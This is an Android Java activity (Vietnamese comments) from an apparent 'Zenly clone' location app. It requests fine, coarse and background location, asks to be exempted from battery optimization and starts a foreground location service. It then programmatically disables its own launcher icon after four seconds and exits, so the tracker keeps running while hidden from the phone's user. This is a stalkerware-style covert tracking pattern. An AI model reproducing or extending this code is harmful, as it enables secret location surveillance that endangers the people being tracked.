package com.example.zenlyrootjava;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;

public class MainActivity extends Activity {

    private static final int REQUEST_ALL_PERMISSIONS = 1234;
    private static final int REQUEST_BACKGROUND_LOCATION = 999;

    private static final String[] BASIC_PERMISSIONS = new String[]{
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d("ZenlyClone", "MainActivity started");

        requestNecessaryPermissions();
        requestIgnoreBatteryOptimization();
    }

    private void requestNecessaryPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ArrayList<String> permissionsToRequest = new ArrayList<>();

            // Các quyền cơ bản về vị trí
            for (String permission : BASIC_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }

            // Android 13+ cần xin quyền thông báo
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
                }
            }

            if (!permissionsToRequest.isEmpty()) {
                ActivityCompat.requestPermissions(this,
                        permissionsToRequest.toArray(new String[0]),
                        REQUEST_ALL_PERMISSIONS);
            } else {
                Log.d("ZenlyClone", "Đã cấp quyền cơ bản");
                requestBackgroundLocationPermission();
            }
        } else {
            startLocationServiceAndHideIcon();
        }
    }

    private void requestBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    REQUEST_BACKGROUND_LOCATION);
        } else {
            startLocationServiceAndHideIcon();
        }
    }

    private void requestIgnoreBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        String pkg = getPackageName();
        if (!pm.isIgnoringBatteryOptimizations(pkg)) {
            Log.d("ZenlyClone", "Requesting ignore battery optimization");
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + pkg));
            startActivity(intent);
        } else {
            Log.d("ZenlyClone", "Battery optimization already ignored");
        }
    }

    private void startLocationServiceAndHideIcon() {
        // Khởi động foreground service
        Intent serviceIntent = new Intent(this, LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d("ZenlyClone", "Starting foreground service");
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Toast.makeText(this, "Zenly clone đang chạy nền", Toast.LENGTH_SHORT).show();

        // Ẩn icon launcher sau 4 giây
        new Handler().postDelayed(() -> {
            Context appContext = getApplicationContext();
            PackageManager pm = appContext.getPackageManager();
            ComponentName componentName = new ComponentName(appContext, MainActivity.class);

            pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );

            Log.d("ZenlyClone", "Đã ẩn icon launcher");
        }, 4000);

        // Thoát Activity
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d("ZenlyClone", "MainActivity destroyed");
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_ALL_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Log.d("ZenlyClone", "Người dùng đã cấp quyền cơ bản");
                requestBackgroundLocationPermission();
            } else {
                Log.e("ZenlyClone", "Người dùng từ chối quyền cơ bản");
                Toast.makeText(this, "App cần quyền vị trí & thông báo để hoạt động!", Toast.LENGTH_LONG).show();
            }

        } else if (requestCode == REQUEST_BACKGROUND_LOCATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d("ZenlyClone", "Người dùng đã cấp quyền background location");
                startLocationServiceAndHideIcon();
            } else {
                Log.e("ZenlyClone", "Từ chối ACCESS_BACKGROUND_LOCATION");
                Toast.makeText(this, "App cần quyền định vị nền để hoạt động!", Toast.LENGTH_LONG).show();
            }
        }
    }
}
